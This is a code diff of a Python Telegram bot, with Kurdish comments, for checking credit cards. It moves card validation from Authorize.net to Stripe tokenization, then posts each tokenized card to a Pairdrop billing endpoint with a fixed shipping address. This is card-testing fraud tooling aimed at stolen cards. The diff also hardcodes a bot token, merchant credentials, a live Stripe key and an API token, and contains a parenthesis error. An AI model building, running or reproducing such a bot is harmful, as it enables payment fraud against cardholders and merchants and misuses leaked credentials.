@@ -1,171 +1,122 @@
 import telebot
 import requests
-import json
 import re
-from datetime import datetime
 
-# Configuration
-BOT_TOKEN = '7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI'
-WEBSITE_API_ENDPOINT = 'http://api.localexpress.io/api'
-AUTHORIZE_NET_API = 'http://api.authorize.net/xml/v1/request.api'
-MERCHANT_AUTH = {
-    "name": "9JLp2E4gWw",
-    "clientKey": "9x5n89K6drAB4u9ue5PPuZKUSb55hYu2hY52GU84AjCxPb6paXFj9Jr8Be4S5J5e"
-}
+# ڕێکخستنەکان
+TOKEN = '7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI'
+STRIPE_API = 'https://api.stripe.com/v1/tokens'
+PAIRDROP_API = 'https://api.pairdrop.com/api/userservicebilling/'
+STRIPE_KEY = 'pk_live_wQf9xVndaHc2rb640vDWtzvK00KqIMTv5I'  # پێویستە بگۆڕیت بە keyـەکەی خۆت
 
-# Initialize bot
-bot = telebot.TeleBot(BOT_TOKEN)
+bot = telebot.TeleBot(TOKEN)
+
+def check_card_format(message):
+    # پشکنینی فۆڕماتەکانی کارت
+    pattern1 = r'^\d{16}\|\d{2}\|\d{2}\|\d{3}$'  # 4831380058036495|04|27|737
+    pattern2 = r'^\d{16}\|\d{2}\|\d{4}\|\d{3}$'  # 4831380058036495|04|2027|737
+    
+    return bool(re.match(pattern1, message.text) or bool(re.match(pattern2, message.text))
 
 def extract_card_info(message):
-    """Extract card details from message text"""
-    patterns = {
-        'card_number': r'\b(?:\d[ -]*?){13,16}\b',
-        'exp_date': r'\b(0[1-9]|1[0-2])/?([0-9]{2})\b',
-        'cvv': r'\b\d{3,4}\b',
-        'zip': r'\b\d{5}(?:-\d{4})?\b',
-        'name': r'([A-Z]{2,}\s[A-Z]{2,})'
+    # جیاکردنەوەی زانیارییەکانی کارت
+    parts = message.text.split('|')
+    return {
+        'number': parts[0],
+        'exp_month': parts[1],
+        'exp_year': parts[2] if len(parts[2]) == 4 else '20' + parts[2],
+        'cvc': parts[3]
     }
-    
-    info = {}
-    text = message.text.upper()
-    
-    # Find card number
-    card_match = re.search(patterns['card_number'], text.replace(' ', ''))
-    if card_match:
-        info['card_number'] = card_match.group(0).replace(' ', '')
-    
-    # Find expiration date
-    exp_match = re.search(patterns['exp_date'], text)
-    if exp_match:
-        info['exp_date'] = f"{exp_match.group(1)}{exp_match.group(2)}"
-    
-    # Find CVV
-    cvv_match = re.search(patterns['cvv'], text)
-    if cvv_match:
-        info['cvv'] = cvv_match.group(0)
-    
-    # Find ZIP code
-    zip_match = re.search(patterns['zip'], text)
-    if zip_match:
-        info['zip'] = zip_match.group(0)
-    
-    # Find cardholder name
-    name_match = re.search(patterns['name'], text)
-    if name_match:
-        info['name'] = name_match.group(1)
-    
-    return info
 
-def check_with_authorize_net(card_info):
-    """Check card validity with Authorize.net API"""
-    payload = {
-        "securePaymentContainerRequest": {
-            "merchantAuthentication": MERCHANT_AUTH,
-            "clientId": "telegram-bot-1.0",
-            "data": {
-                "type": "TOKEN",
-                "id": "CC_CHECK_" + datetime.now().strftime("%Y%m%d%H%M%S"),
-                "token": {
-                    "cardNumber": card_info.get('card_number', ''),
-                    "expirationDate": card_info.get('exp_date', '0125'),
-                    "cardCode": card_info.get('cvv', '000'),
-                    "zip": card_info.get('zip', '00000'),
-                    "fullName": card_info.get('name', 'CARD HOLDER')
-                }
-            }
-        }
+def check_with_stripe(card_info):
+    # پشکنین بە Stripe API
+    headers = {
+        'Host': 'api.stripe.com',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Authorization': f'Bearer {STRIPE_KEY}'
     }
     
+    data = {
+        'card[number]': card_info['number'],
+        'card[exp_month]': card_info['exp_month'],
+        'card[exp_year]': card_info['exp_year'],
+        'card[cvc]': card_info['cvc'],
+        'card[currency]': 'USD'
+    }
+    
+    try:
+        response = requests.post(STRIPE_API, headers=headers, data=data)
+        return response.json()
+    except Exception as e:
+        print(f"هەڵە لە Stripe API: {e}")
+        return None
+
+def send_to_pairdrop(card_info, stripe_token):
+    # ناردن بۆ Pairdrop API
     headers = {
+        'Host': 'api.pairdrop.com',
         'Content-Type': 'application/json',
-        'Accept': 'application/json'
+        'Authorization': 'Token c8a369e46815140459542592fd3580c762eb484f'  # پێویستە بگۆڕیت
     }
     
-    try:
-        response = requests.post(AUTHORIZE_NET_API, json=payload, headers=headers)
-        return response.json()
-    except Exception as e:
-        print(f"Authorize.net API error: {e}")
-        return None
-
-def send_to_website(card_info, api_response, chat_info):
-    """Send data to your website API"""
     payload = {
-        "action": "card-check-result",
-        "params": {
-            "cardNumber": card_info.get('card_number', ''),
-            "expiration": card_info.get('exp_date', ''),
-            "checkResult": "success" if api_response else "failed",
-            "response": api_response,
-            "user": {
-                "chat_id": chat_info.id,
-                "username": chat_info.username,
-                "first_name": chat_info.first_name,
-                "last_name": chat_info.last_name
-            }
+        "collage_id": "85731",
+        "billing": {
+            "email": "Peshangdev@gmail.com",
+            "card_info": {
+                "card_number": card_info['number'],
+                "name": "JohnDoe",
+                "expire_month": card_info['exp_month'],
+                "expire_year": card_info['exp_year']
+            },
+            "stripe_token": stripe_token
+        },
+        "box_fee": "1",
+        "shipping": {
+            "phone": "3144740104",
+            "address": "198WhiteHorsePike",
+            "city": "Collingswood",
+            "email": "Peshangdev@gmail.com",
+            "zip": "08107",
+            "recipient": "JohnDoe",
+            "state": "NEWJERSEY"
         }
     }
     
-    headers = {
-        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
-        'Accept': 'application/json'
-    }
-    
     try:
-        response = requests.post(WEBSITE_API_ENDPOINT, data=payload, headers=headers)
-        return response.json()
+        response = requests.post(PAIRDROP_API, headers=headers, json=payload)
+        return response.status_code == 200
     except Exception as e:
-        print(f"Website API error: {e}")
-        return None
+        print(f"هەڵە لە Pairdrop API: {e}")
+        return False
 
-@bot.message_handler(commands=['start', 'help'])
+@bot.message_handler(commands=['start'])
 def send_welcome(message):
     instructions = """
-    Welcome to Credit Card Checker Bot.
-    
-    Send me credit card details in this format:
-    
-    Card Number: 4355460508715678
-    Exp: 03/32
-    CVV: 819
-    ZIP: 08107
-    Name: JOHN DOE
-    
-    I'll check the card and report back.
-    """
+سڵاو! بۆتێکی پشکنینی کارتی کرێدیتە.
+
+ناردنی زانیاری کارت بە یەکێک لەم شێوازانە:
+
+4831380058036495|04|27|737
+یان
+4831380058036495|04|2027|737
+"""
     bot.reply_to(message, instructions)
 
 @bot.message_handler(func=lambda message: True)
-def handle_card_check(message):
-    # Extract card info from message
-    card_info = extract_card_info(message)
-    
-    if not card_info.get('card_number'):
-        bot.reply_to(message, "❌ Could not find a valid card number in your message.")
+def handle_card(message):
+    if not check_card_format(message):
         return
     
-    # Check with Authorize.net
-    bot.send_message(message.chat.id, "🔍 Checking card...")
-    api_response = check_with_authorize_net(card_info)
+    card_info = extract_card_info(message)
+    bot.send_message(message.chat.id, "🔍 پشکنینی کارت...")
     
-    # Send results to website
-    website_response = send_to_website(card_info, api_response, message.chat)
+    # پشکنین بە Stripe
+    stripe_result = check_with_stripe(card_info)
     
-    # Prepare response for user
-    if api_response:
-        response_text = f"""
-        ✅ Card Check Results:
-        
-        Number: {card_info.get('card_number')[:6]}...{card_info.get('card_number')[-4:]}
-        Status: {"Valid" if 'success' in str(api_response).lower() else "Invalid"}
-        
-        Response sent to website.
-        """
+    if stripe_result and 'id' in stripe_result:
+        # ناردن بۆ Pairdrop
+        send_to_pairdrop(card_info, stripe_result['id'])
     else:
-        response_text = "❌ Failed to check card. Please try again later."
-    
-    bot.reply_to(message, response_text)
+        print("پشکنین سەرنەکەوت")
 
-if __name__ == '__main__':
-    print("Bot is running...")
-    bot.infinity_polling()
+bot.infinity_polling()
